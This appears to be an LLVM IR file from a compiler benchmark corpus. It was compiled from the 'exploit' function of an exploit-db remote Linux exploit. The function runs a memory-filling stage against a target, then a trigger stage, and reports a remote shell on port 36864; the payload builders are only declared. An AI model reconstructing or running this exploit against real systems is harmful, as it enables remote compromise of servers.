; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_660.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [47 x i8] c"Stage 1: Filling mem with bad pdestructor ... \00", align 1
@IP = common dso_local global i32 0, align 4
@request1 = common dso_local global i32 0, align 4
@request2 = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"DONE\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [42 x i8] c"Stage 2: Triggering memory_limit now ... \00", align 1
@request3 = common dso_local global i32 0, align 4
@request4 = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"Shell on port 36864\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %16, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 5
  br i1 %5, label %6, label %19

6:                                                ; preds = %3
  %7 = load i32, i32* @IP, align 4
  %8 = call i32 @xp_connect(i32 %7)
  %9 = load i32, i32* @request1, align 4
  %10 = call i32 @xp_write(i32 %9)
  %11 = call i32 @build1(i32 5000, i32 1)
  %12 = load i32, i32* @request2, align 4
  %13 = call i32 @xp_write(i32 %12)
  %14 = load i32, i32* @sock, align 4
  %15 = call i32 @close(i32 %14)
  br label %16

16:                                               ; preds = %6
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %3

19:                                               ; preds = %3
  %20 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  %22 = load i32, i32* @IP, align 4
  %23 = call i32 @xp_connect(i32 %22)
  %24 = load i32, i32* @request3, align 4
  %25 = call i32 @xp_write(i32 %24)
  %26 = call i32 @build3(i32 8192, i32 255)
  %27 = call i32 @build3(i32 7265, i32 1)
  %28 = load i32, i32* @request4, align 4
  %29 = call i32 @xp_write(i32 %28)
  %30 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  ret void
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @xp_connect(i32) #1

declare dso_local i32 @xp_write(i32) #1

declare dso_local i32 @build1(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @build3(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
